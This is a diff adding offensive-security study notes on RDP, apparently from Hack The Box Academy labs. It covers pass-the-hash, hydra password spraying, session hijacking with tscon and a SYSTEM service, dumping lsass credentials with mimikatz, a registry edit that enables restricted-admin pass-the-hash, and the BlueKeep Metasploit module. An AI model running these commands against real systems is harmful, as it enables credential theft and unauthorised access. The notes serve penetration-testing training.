@@ -29,11 +29,65 @@
                 <pre><code class="language-bash">xfreerdp3 /v:10.129.11.120  /u:htb-student /p:Academy_WinFun!</code></pre>
                 <p>Also you can mount the filesystem</p>
                 <pre><code class="language-bash">xfreerdp3 /v:10.129.11.120  /u:htb-student /p:Academy_WinFun! /drive:linux,/home</code></pre>    
+                <p>Pass-the-hash example</p>
+                <pre><code class="language-bash">xfreerdp3 /v:10.129.11.120  /u:htb-student /pth:0E14B9D6330BF16C30B1924111104824</code></pre>  
             </ul>
             
             <h2>Enumeration</h2>
             <ul>
                 <pre><code class="language-bash">nmap -sV -sC 10.129.201.248 -p3389 --script rdp*</code></pre> 
+            </ul>
+
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>Password spraying</h3>
+                <ul>
+                    <p>In case we don't know a user's password we can try to guess it using password spray</p>
+                    <pre><code class="language-bash">hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp</code></pre>
+                    <p>We can also perform it using two wordlists</p>
+                    <pre><code class="language-bash">hydra -L usernames.txt -P password.txt 192.168.2.143 rdp</code></pre>
+                </ul>
+
+                <h3>RDP Session Hijacking</h3>
+                <ul>
+                    <p>We can try to steal the session to another user which is logged in the same computer that we are. First we must guess which user id has the target user</p>
+                    <pre><code class="language-powershell">query user</code></pre>
+                    <p>To successfully impersonate a user without their password we can do if we have the following privielges</p>
+                    <h4>SYSTEM</h4>
+                    <ul>
+                        <p>Use the Microsoft <a class="notion-link" href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon">tscon.exe</a></p>
+                        <p>With the information gained with the query user use the following command</p>
+                        <pre><code class="language-bash">tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}</code></pre>
+                    </ul>
+
+                    <h4>Local administrator</h4>
+                    <ul>
+                        <p>It can be performed with different ways. A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges we will use sc.exe</p>
+                        <p></p>
+                        <pre><code class="language-cmd">sc.exe create sessionhijack binpath= "cmd.exe /k tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}"</code></pre>
+                        <p>Finally run the command by typing</p>
+                        <pre><code class="language-cmd">net start sessionhijack</code></pre>
+                        <p>Once the service is started a new terminal with the target user will apear</p>
+                        <b>Mimikatz</b>
+                        <p>Other way we can use it's mimikatz wich allow us to list the logon passwords. Since this is a logged on user the password will be there in the lsass</p>
+                        <pre><code class="language-cmd">sekurlsa::logonpasswords</code></pre>
+                    </ul>
+                </ul>
+
+                <h3>Disable restricted Admin</h3>
+                <ul>
+                    <p>In some cases you'll encounter that you have a NTLM hash of an account and we can't perform a pass-the-hash trough RDP since the value <b>DisableRestrictedAdmin is set to 1</b>.This key can be set to 0 using</p>
+                    <p></p>
+                    <pre><code class="language-cmd">reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></pre>
+                </ul>
+
+                <h3>BlueKeep</h3>
+                <ul>
+                    <p>The vulnerability is also based, as with SMB, on manipulated requests sent to the targeted service, the vulnerability does not require user authentication to be triggered. Instead, the vulnerability occurs after initializing the connection when basic settings are exchanged between client and server. This is known as a Use-After-Free (UAF) technique that uses freed memory to execute arbitrary code.</p>
+                    <p>The following OS are affected: WS 2003, 2008, 2008 R2, XP, Vista, 7</p>
+                    <p>Use the following metasploit module to exploit it</p>
+                    <pre><code class="language-cmd">exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code></pre>
+                </ul>
             </ul>
         </div>
     </div>
